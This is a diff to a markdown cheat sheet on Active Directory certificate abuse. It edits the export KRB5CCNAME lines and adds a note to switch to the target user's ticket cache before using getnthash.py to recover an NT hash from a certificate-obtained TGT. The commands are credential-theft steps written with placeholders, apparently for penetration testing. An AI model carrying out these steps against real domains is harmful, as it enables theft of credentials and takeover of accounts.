@@ -21,7 +21,7 @@ getTGT.py '<domain>/<username>:<password>' -dc-ip <dc-ip>
 Set the env var to the output ccache
 
 ```shell
-export KRB5CCNAME=<username>.ccache
+export KRB5CCNAME=/full/path/to/<username>.ccache
 ```
 
 Enumerate Certificate Authorities on the domain (CA's)
@@ -49,6 +49,10 @@ python3 gettgtpkinit.py <domain>/<username> -cert-pfx <pfx-certificate-file> -pf
 Get NTHash from requestd TGT above (KEY is outputed from the command above) 
 ```shell
 python3 getnthash.py -key <AS-REP-encryption-key> -dc-ip <dc-ip> <domain>/<username> output_tgt.ccache
+```
+Note: You have to change the KRB5CCNAME variable to the target users tgt ccache file first (admin_tgt.ccache above):
+```shell
+export KRB5CCNAME=/full/path/to/<username>.ccache
 ```
 
 ## Relaying On Linux
